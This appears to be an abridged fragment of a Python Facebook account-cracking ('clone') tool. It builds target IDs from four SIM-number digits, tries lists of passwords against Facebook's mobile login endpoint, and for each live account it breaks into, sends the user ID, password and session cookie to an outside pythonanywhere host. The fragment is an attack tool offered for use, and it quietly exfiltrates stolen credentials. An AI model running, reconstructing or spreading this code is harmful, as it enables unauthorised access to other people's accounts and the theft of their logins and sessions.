...
def SUMON4():
    ...
    os.system('clear')
    print(logo)
    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (0177)')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    kode = input('[?] INPUT CODE : ')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('[?] LIMIT CLONE : '))
...
def mbasic(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            url = "https://m.alpha.facebook.com/login/device-based/login/async/"
            ...
            if "c_user" in response:
                ...
                if "live" in check:
                      ...
                      requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={cid}|{pw}|{coki}")
                      oks.append(cid)
                      break
                else:
                    break
